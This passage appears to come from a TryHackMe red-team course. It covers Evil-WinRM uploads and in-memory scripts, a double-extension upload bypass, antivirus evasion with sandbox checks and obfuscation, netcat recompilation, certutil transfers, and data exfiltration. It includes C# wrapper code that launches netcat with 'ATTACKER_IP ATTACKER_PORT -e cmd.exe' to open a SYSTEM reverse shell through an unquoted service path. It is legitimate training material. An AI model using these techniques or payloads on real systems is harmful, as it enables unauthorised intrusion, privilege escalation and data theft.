style="width:954px" alt="Demonstrating a file upload in Evil-WinRM using nc.exe as an example" src="https://assets.tryhackme.com/additional/wreath-network/e02003103ad1.png" /></p><p align="left">In this example we upload an example tool (<code>nc.exe</code>) to <code>C:\\Windows\\Temp</code>, we then create a new file (<code>demo.txt</code>) and download it to the current working directory. Note that in the real world using the <code>C:\\Windows\\Temp</code> directory is often a bad idea as it\'s flagged as a common location for hackers to upload tools. In this case we are using it to keep the box neat and tidy for other users. <br /></p><p align="left"><u><b><span style="font-size:18px">Local Scripts:</span></b></u><br />Uploading tools is all well and good, but if the tool happens to be a PowerShell script then there is another (even more convenient) method. If you check the help menu for evil-winrm, you will see an interesting <code>-s</code> option. This allows us to specify a local directory containing PowerShell scripts -- these scripts will be made accessible for us to import directly into memory using our evil-winrm session (meaning they don\'t need to touch the disk at all). For example, if we happened to have our scripts located at <code>/opt/scripts</code>, we could include them in the connection with:<br /><code>evil-winrm -u USERNAME\xa0 -p PASSWORD -i IP -s /opt/scripts</code><br /></p><p align="left">Let\'s use this option to include the Empire Portscan module.</p><p align="left">The Empire scripts are stored at <code>/usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/</code> if you installed using apt as recommended. A copy of this tool is also included in the zipfile attached to Task 1, or can be downloaded <a href="https://github.com/BC-SECURITY/Empire/blob/master/empire/server/data/module_source/situational_awareness/network/Invoke-Portscan.ps1" target="_blank">here</a>, if you can\'t find it locally.<br /></p><p align="left">Regardless, we can now sign in as the Administrator using the password hash discovered previously, including the Empire network scanning scripts:<br /><code>evil-winrm -u Administrator -H HASH -i IP -s EMPIRE_DIR</code><br /></p><p align="left">Type <code>Invoke-Portscan.ps1</code> and press enter to initialise the script.<br /></p><p align="left">Now if we type <code>Get-Help Invoke-Portscan</code> we should see the help menu for the tool without having to import or upload anything manually!<img style="width:601px" alt="Demonstrating the Get-Help cmdlet for the imported function" src="https://assets.tryhackme.com/additional/wreath-network/67448956442a.png" /></p><hr /><p align="left">The Empire Portscan module is designed to be similar to Nmap in terms of syntax.

In short, images have their dimensions encoded in their exif data. The <code>getimagesize()</code> method returns these dimensions if the file is genuinely an image, or the boolean value <code>False</code> if the file is not an image. This is more difficult to bypass than other filters, but it\'s far from impossible to do so.</p><p> The second line is an If statement which checks two conditions. If either condition fails (indicated by the "Or" operator: <code>||</code>) then the script will redirect with a Failure message. The second condition is easy: <code>!$size</code> just checks to see if the <code>$size</code> variable contains the boolean <code>False</code>.

Here it\'s being used to split the name of the file we uploaded at each period (<code>.</code>). From this we can (rightly) assume that this is a file-extension filter. As an example, if we were to upload a file called <code>image.jpeg</code>, this function would return a list: <code>["image", "jpeg"]</code>. As the filter only really needs the file-extension, it then grabs the second item from the list (<code>[1]</code>), remembering that lists start at 0.</p><p>This, unfortunately, leads to a big problem. What happens if there\'s more than one file extension? Let\'s say we upload a file called <code>image.jpeg.php</code>.

It\'s a constant dance between hackers and developers. Every time the developers release a new feature, the hackers develop a way around it. Every time the hackers bypass a new feature, the developers release another feature to close off the exploit, and so the cycle continues. Due to the speed of this process, it is nigh impossible to teach bleeding-edge techniques (and expect them to stay relevant for any length of time), so we are only going to be covering the fundamentals of the topic here. Without further ado, let\'s dive in!<br /></p><hr /><p>When it comes to AV evasion we have two primary types available:</p><ul><li>On-Disk evasion</li><li>In-Memory evasion</li></ul><p>On-Disk evasion is when we try to get a file (be it a tool, script, or otherwise) saved on the target, then executed. This is very common when working with executable (<code>.exe</code>) files.</p><p>In-Memory evasion is when we try to import a script directly into memory and execute it there. For example, this could mean downloading a PowerShell module from the internet or our own device and directly importing it without ever saving it to the disk.<br /></p><p>In ages past, In-Memory evasion was enough to bypass most AV solutions as the majority of antivirus software was unable to scan scripts stored in the memory of a running process. This is no longer the case though, as Microsoft implemented a feature called the <b>A</b>nti-<b>M</b>alware <b>S</b>can <b>I</b>nterface (AMSI). AMSI is essentially a feature of Windows that scans scripts as they enter memory. It doesn\'t actually check the scripts itself, but it does provide hooks for AV publishers to use -- essentially allowing existing antivirus software to obtain a copy of the script being executed, scan it, and decide whether or not it\'s safe to execute. Whilst there are various bypasses for this (often involving tricking AMSI into failing to load), these are out of scope for this room.</p><p>In terms of methodology: ideally speaking, we would start by attempting to fingerprint the AV on the target to get an idea of what solution we\'re up against. As this is often an interactive (social-engineering reliant) process, we will skip it for now and assume that the target is running the default Windows Defender so that we can get straight into the meat of the topic. If we already have a shell on the target, we may also be able to use programs such as <a href="https://github.com/PwnDexter/SharpEDRChecker" target="_blank">SharpEDRChecker</a> and <a href="https://github.com/GhostPack/Seatbelt" target="_blank">Seatbelt</a> to identify the antivirus solution installed. Once we know the OS version and AV of the target, we would then attempt to replicate this environment in a virtual machine which we can use to test payloads against. Note that we should <i>always</i> disable any kind of cloud-based protection in the AV settings (potentially by outright disconnecting the VM from the internet) so that the AV doesn\'t upload our carefully crafted payloads to a server somewhere for analysis, destroying all our hard work. Once we have a working payload, we can then deploy it against the target!</p><p>AV Evasion usually involves some form of obfuscation when it comes to payloads. This could mean anything from moving things around in the exploit and changing variable names, to encoding aspects of the script, to outright encrypting the payload and writing a wrapper to decrypt and execute the code section-by-section. The aim is to switch things enough that the AV software is unable to detect anything bad.<br /></p>', 'taskType': 'none', 'taskNo': 38, 'taskCreated': '2021-01-24T23:32:39.508Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Which category of evasion covers uploading a file to the storage on the target before executing it?<br />', 'hint': ''}, {'questionNo': 2, 'question': '<p>What does AMSI stand for?<br /></p>', 'hint': ''}, {'questionNo': 3, 'question': '<p>Which category of evasion does AMSI affect?<br /></p>', 'hint': ''}]}, {'taskTitle': '<span class="badge size-16" style="background-color:rgba(201,207,255,.18);color:#c9cfff">AV Evasion</span> AV Detection Methods', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/KHUQWshXcjc" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p>Before we get into the practical side of things, let\'s talk a little about the different detection methods employed by antivirus software.</p><p>Generally speaking, detection methods can be classified into one of two categories:</p><ul><li>Static Detection</li><li>Dynamic / Heuristic / Behavioural Detection</li></ul><p>Modern Antivirus software will usually rely on a combination of these.<br /></p><hr /><p>Static detection methods usually involve some kind of signature detection. A very rudimentary system, for example, would be taking the hashsum of the suspicious file and comparing it against a database of known malware hashsums. This system does tend to be used; however, it would never be used by itself in modern antivirus solutions. For this reason it\'s usually a good idea to change <i>something</i> when working with a known exploit. The smallest change to the file will result in a completely different hashsum, so even something as small as changing a string in the help message would be enough to bypass this kind of rudimentary detection system.</p><p>Fortunately (or unfortunately for us as hackers), this is usually nowhere near enough to bypass static detection methods.</p><p>The other form of static detection which is often used in antivirus software (to much greater effect) is a technique called Byte (or string) matching.<img style="width:150px;padding:20px;float:right" src="https://assets.tryhackme.com/additional/wreath-network/MDliMWY4MjNl.png" class="note-float-right" /> Byte matching is another form of signature detection which works by searching through the program looking to match sequences of bytes against a known database of bad byte sequences. This is much more effective than just hashing the entire file! Of course, it also means that we (as hackers) have a much harder job tracking down the exact line of code responsible for the flag.<br /></p><p>The tradeoff with this method is, of course, speed. Checking small sequences of bytes against a potentially huge program with multiple libraries can take a comparatively long time compared to the milliseconds it would take to hash the entire file and compare the hash against a database. As such, a compromise is sometimes made whereby the AV program hashes small sections of the file to check against the database, rather than hashing the entire thing. This obviously reduces the effectiveness of the technique, but does increase the speed somewhat.<br /></p><hr /><p>Where static virus malware detection methods look at the file itself, dynamic methods look at how the file <i>acts.</i> There are a couple of ways to do this.</p><ol><li>AV software can go through the executable line-by-line checking the flow of execution. Based on <i>pre-defined rules</i> about what type of action is malicious (e.g. is the program reaching out to a known bad website, or messing with values in the registry that it shouldn\'t be?), the AV can see how the program <i>intends</i> to act, and make decisions accordingly</li><li>The suspicious software can outright be executed inside a sandbox environment under close supervision from the AV software. If the program acts maliciously then it is quarantined and flagged as malware</li></ol><p><img style="width:125px;margin:20px;float:left" src="https://assets.tryhackme.com/additional/wreath-network/YzZkODljOGJm.png" class="note-float-left" />Evading these measures is still perfectly possible, although a lot harder than evading static detection techniques. Sandboxes tend to be relatively distinctive, so we just need to look for various system values (e.g. is there a fan installed, is there a GUI, and if so, what resolution is it, are there any distinctive tools or services running -- <code>VMtools</code> for VMware virtual machines, for example) and check to see if there are any red flags. For example, a machine with no fan, no GUI and a classic VM service running is very likely to be a sandbox -- in which case the program should just exit. If the program exits without doing anything malicious then the AV software is fooled into believing that it\'s safe and allows it to be executed on the target.</p><p>Equally, with logic-flow analysis, the AV software is still only working with a set of rules to check malicious behaviour. If the malware acts in a way that is unexpected (e.g. has some random code that does the grand sum of nothing inserted into the exploit) then it will likely pass this detection method.</p><p>In addition to this, when working with certain kinds of delivery methods, password protecting the file can get straight around the behavioural analysis checks as (unlike the user who knows the password), the AV software is unable to open and execute the file.</p><p>That said, dynamic detection methods are usually a lot more effective than static methods. The drawback is, once again, the time and resources required to spin up a VM to analyse the file in, or go through it line-by-line to see if it\'s doing anything malicious. These are actions that take time (causing users to grow impatient), and use up a lot of the computer\'s available resources. Once again the AV has to compromise, using a combination of dynamic and static analysis when scanning a file.<br /></p><hr /><p>To make life harder still, antivirus vendors are usually in close contact with one another -- as well as with scanning sites such as <a href="https://www.virustotal.com/" target="_blank">VirusTotal</a>. When the AV detects a suspicious file, it usually sends the file back to servers owned by the provider where it gets analysed and shared with other providers. What this means is that once our payload is detected on one computer, the chances are that it will quickly be taken apart and shielded against. This rapid sharing of information allows AV providers to stay ahead of bad actors (a good thing), but also obviously adds an extra complication into our job as Ethical Hackers.</p><p>Additionally, new techniques are being developed all the time. For example, many attempts are being made to use machine learning techniques to dynamically update the list of bad behaviours in a sandbox environment, or the rule-lists used in logic-flow analysis of a suspicious file.

Unfortunately Defender knows exactly what PowerShell reverse shells look like, so we\'d have to do some serious obfuscation to get this to work.</li><li>We could try to get a PHP reverse shell as we know the target has a PHP interpreter installed. Windows PHP reverse shells tend to be iffy though, and again, may trigger Defender.</li><li>We could generate an executable reverse shell using msfvenom, then upload and activate it using the webshell. Again, msfvenom shells tend to be very distinctive. We could use the <a href="https://www.veil-framework.com/" target="_blank">Veil Framework</a> to give us a meterpreter shell executable that might bypass Defender, but let\'s try to keep this manual for the time. Equally, <a href="https://www.shellterproject.com/" target="_blank">shellter</a> (though old) might give us what we need. There are easier options though.</li><li>We could upload netcat. This is the quick and easy option.</li></ul><p>The only problem with uploading netcat is that there are hundreds of different variants -- the version of netcat for Windows that comes with Kali is known to Defender, so we\'re going to need a different version. Fortunately there are many floating around! Let\'s use one from github, <a href="https://github.com/int0x33/nc.exe/" target="_blank">here</a>.</p><p>Clone the repository:<br /><code>git clone https://github.com/int0x33/nc.exe/</code><br /></p><p>This repository already contains pre-compiled netcat binaries for both 32 and 64 bit systems, however, this is an ideal time to talk about cross-compilation techniques. If you\'d prefer to just use the default binaries then just skip to the last section of this task and use the <code>nc64.exe</code> binary from the repository.</p><hr /><p>Cross compilation is an essential skill -- although in many ways it\'s preferable to avoid it. </p><p>First up: what is cross compilation? The idea is to compile source code into a working program to run on a different platform. In other words, cross compilation would allow us to compile a program for a different Linux kernel, a Windows program on Kali (as we\'re doing here), or even software for an embedded device or phone.</p><p>Whilst cross-compilation is a very useful skill to have, it\'s often difficult to get completely correct. Ideally we should always try to compile our code in an environment as close to the target environment as possible. For example, if an exploit or program is designed to work on CentOS 7.2, we should try to compile it in a CentOS 7.2 VM if possible. Equally, it\'s essential that we get the same arch as that of the target -- a 64 bit program won\'t work very well on a 32 bit target!</p><p>Sometimes it\'s easiest to just cross-compile, however. Generally speaking we cross compile x64 Windows programs on Kali using the <code>mingw-w64</code> package (for x64 systems). This is not installed on Kali by default, however it is available in the Kali apt repositories:<br /><code>sudo apt install mingw-w64</code><br /></p><p>This is a big package, but once it\'s installed we can start re-compiling netcat.</p><p>Much like we use <code>gcc</code> to compile binaries on Linux, we can use the <code>mingw</code> compilers to compile Windows binaries. These tend to have very descriptive (read: long) names, but the one that\'s of particular importance to us here is <code>x86_64-w64-mingw32-gcc</code>. This specifies that we want to compile a 64bit binary.<br /></p><p>Inside the nc.exe repository we downloaded, delete or move the two pre-compiled netcat binaries. The repository provides a makefile which we can use (with some small alterations) to compile the binary. Open up the <code>Makefile</code> with your favourite text editor. The first two lines specify which compiler to use:<br /><img style="width:210px" alt="The first two lines of the Makefile at their default" src="https://assets.tryhackme.com/additional/wreath-network/499921a44689.png" /></p><p>Neither of these are quite what we\'re looking for, so comment out the first line and add another line underneath:<br /><code>CC=x86_64-w64-mingw32-gcc</code><br /><img style="width:214px" alt="The first (now three) lines of the makefile after commenting out the first line and adding in the correct compiler on line three" src="https://assets.tryhackme.com/additional/wreath-network/d71f7f2fcb0e.png" /><br /></p><p>Now when we run <code>make</code> to build the binary, the correct compiler will be used to generate a x64 Windows executable. Note that there will be a lot of warnings generated by the compiler (these have been redirected to <code>/dev/null</code> in the following screenshot for readability, however, you do not need to do this). These are nothing to worry about; the compilation should still be successful.<br /><img style="width:1075.53px" alt="Demonstrating the compilation process using the make command" src="https://assets.tryhackme.com/additional/wreath-network/b29a99fd33fd.png" /><br /></p>', 'taskType': 'none', 'taskNo': 41, 'taskCreated': '2021-01-27T22:25:24.454Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<b>Bonus Question (optional): </b>Follow the steps detailed above to compile a copy of netcat.exe (otherwise use the copy already in the repo).<br />', 'hint': ''}, {'questionNo': 2, 'question': '<p>With a copy of netcat available, we now need to get it up to the target.</p><p>Start a Python webserver on your attacking machine (as demonstrated numerous times previously):<br /><code>sudo python3 -m http.server 80<br /></code></p><p></p>', 'hint': ''}, {'questionNo': 3, 'question': "<p>Despite it often being much harder to upload binaries to Windows than it is to upload to Linux, we do have a few options here.</p><ul><li>Powershell <i>might</i> work, but with AMSI in play it's a risk.</li><li>We could use the file upload point that we originally exploited to upload an unrestricted PHP file uploader (in the same way that we uploaded the original webshell, although this would be a bit of a pain with embedding the uploader in an image).</li><li>We could look for other command line tools installed on the target such as <code>curl.exe</code> or <code>certutil.exe</code>, both of which might allow for a file upload.</li></ul><p>Try to execute both of this in the webshell -- both should work.</p><p>What output do you get when running the command: <code>certutil.exe</code>?<br /></p>", 'hint': ''}, {'questionNo': 4, 'question': "<p>Certutil is a default Windows tool that is used to (amongst other things) download CA certificates.

The exploits available to manipulate the privilege we found would need to be custom compiled and obfuscated in order to be useful to us; however, with the unquoted service path, all we need is one very small "wrapper" program that activates the netcat binary that we <i>already have on the target.</i> To put it another way, we just need to write a small executable that executes a system command: activating netcat and sending us a reverse shell as the owner of the service (i.e. local system). Ideally we would write a full C# service file that would integrate seamlessly with the Windows service management system. Whilst this is perfectly possible (and is by far the preferable option), for the sake of simplicity, we will stick to just creating a standalone executable. It\'s worth noting that this technique is effective at bypassing the antivirus software on the target; however, in an enterprise situation there is a good chance that it would be picked up by an intrusion detection system. In this scenario we would be looking for a more sophisticated (if similar) solution.<br /></p>Ideally we\'d be using Visual Studio here. If you happen to have a Windows host and are familiar with Visual Studio then please feel free to use it for.

This can be easily installed on Kali and will allow us to compile C# executables that can be run on Windows targets.

At the very top if the file, add the following lines:<br /><code>using System;<br />using System.Diagnostics;<br /></code><br /></p><p>These allow us to start new processes (i.e. execute netcat).</p><p>Next we need to initialise a namespace and class for the program:<br /><code>namespace Wrapper{<br />\xa0\xa0\xa0 class Program{<br />\xa0\xa0\xa0\xa0\xa0\xa0\xa0 static void Main(){<br />\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0 //Our code will go here!<br />\xa0\xa0\xa0\xa0\xa0\xa0\xa0 }<br />\xa0\xa0\xa0 }<br />}</code><br /></p><p>We can now write the code that will call netcat. This goes inside the <code>Main()</code> function (replacing the <code>//Our code will go here!</code> line).</p><p>First, we create a new process, as well as a ProcessStartInfo object to set the parameters for the process:<br /><code>Process proc = new Process();<br />ProcessStartInfo procInfo = new ProcessStartInfo("c:\\\\windows\\\\temp\\\\nc-USERNAME.exe", "ATTACKER_IP ATTACKER_PORT -e cmd.exe");</code><br /></p><p><i>Make sure to replace the </i><code>nc-USERNAME.exe </code><i>with the name of your own netcat executable, as well as slotting in your own IP and Port!</i></p><p>With the objects created, we can now configure the process to not create it\'s own GUI Window when starting:<br /><code>procInfo.CreateNoWindow = true;</code><br /></p><p>Finally, we attach the <code>ProcessStartInfo</code> object to the process, and start the process!<br /><code>proc.StartInfo = procInfo;<br />proc.Start();</code><br /></p><p>Our program is now complete.

Generally speaking, most external engagements will strongly prohibit taking data from compromised systems; however, it is worth bearing in mind that this may not be the case for internal engagements -- and some external engagements outright set targets for the red team that revolve around exfiltrating a set piece of data from the targets once compromised. Even if this is a skill that may not be used on a daily basis, it is still well worth learning.<br /></p><hr /><p>The goal of exfiltration is always to remove data from a compromised target. This could be things like passwords, keys, customer/employee data, or anything else of use or value. If the data being exfiltrated is in plain text then this could be as simple as copying and pasting the contents of a file from a remote shell into a local file. If the data is in a binary format, or otherwise can\'t just be copied and pasted, then more complicated methods must be used to exfiltrate the targeted file. </p><p>A common method for exfiltrating data is to smuggle it out within a harmless protocol, usually encoded. For example, DNS is often used to (relatively) quietly exfiltrate data. HTTPS tends to be a good option as the data will outright be encrypted before egress takes place. ICMP can be used to (very slowly) get the data out of the network. DNS-over-HTTPS is superb for data exfiltration, and even email is often used.<br /></p><p>In a real world situation an attacker will be looking to exfiltrate data as quietly as possible as there may be an Intrusion Detection System active on the compromised network which would alert the network administrators to a breach should the data be detected. For this reason an attacker is unlikely to use protocols as simple as FTP, TFTP, SMB or HTTP; however, in an unmonitored network these are still good options for moving files around.</p><p>It\'s worth noting that most command and control (C2) frameworks come with options to quietly exfiltrate data. Practically speaking, this is likely how a bad actor would be exfiltrating data, so it\'s worth keeping up to date with the current "standards" used by the various frameworks. There are also plenty of standalone tools available to automate sending and receiving obfuscated data.<br /></p><hr /><p>In short, the only limitation when it comes to exfiltration is your imagination. Whilst there are certainly common techniques available (and many tools around to take advantage of them) it will always be the new and obscure methods that are the most successful. Who knows?

You should not necessarily be providing a step-by-step account of your methodology here, but there should be enough detail for a technically-able person to see what the problem is, and what the solutions might be. <br /></li><li>After the findings and remediations should come the <i><b>Attack Narrative</b></i>. This <i>should</i> be a step-by-step writeup of the actions you took against the targets, including enough detail for a technically-competent individual to replicate the attacks exactly in an almost copy-and-paste approach. In many ways this is similar to a detailed write-up for a CTF.</li><li>A section that is good to include but often skipped: the <i><b>Cleanup</b></i> section. This should detail the actions you took to eradicate your presence on the targets (e.g. removing any added accounts, deleting exploits or created files, etc).</li><li>Next (but not last), there should be a <i><b>Conclusion</b></i>. This just summarises the report, rounding off the results and stressing the importance of patching as required.</li><li>Finally you should include <i><b>References</b></i> then <i><b>Appendices</b></i>. The references section includes full references to any works cited throughout the report (for example, maybe a quote or table from the OWASP website, or referencing a newspaper article on an attack which utilised a vulnerability found in the target network). The references section should also be used to link to relevant CVEs (Common Vulnerability and Exposure), CWEs (Common Weakness Enumerations), and/or CAPECs (Common Attack Pattern Enumerations and Classifications) for the found vulnerabilities. Your appendices should include any large pieces of information that would have cluttered up the main text. For example, if you had to edit an exploit (as we did during the Wreath network), you should include a full copy of the edited code as an appendix and reference it when mentioned in the other sections. Equally, any code you write should also be stored here (with the exception of short snippets and one-liners, which can be placed inline at the relevant section), along with any large amounts of data or big tables / diagrams.<br /></li></ul><p>So, the sections should be:</p><ol><li>Executive Summary</li><li>Timeline</li><li>Findings and Remediations</li><li>Attack Narrative</li><li>Cleanup</li><li>Conclusion</li><li>References</li><li>Appendices<br /></li></ol><p>Pentest reports will usually also have a branded front-cover and a table of contents before the report itself begins.<br /></p><p>There are many pentest report templates available on the Internet which can be used to provide a baseline for this.
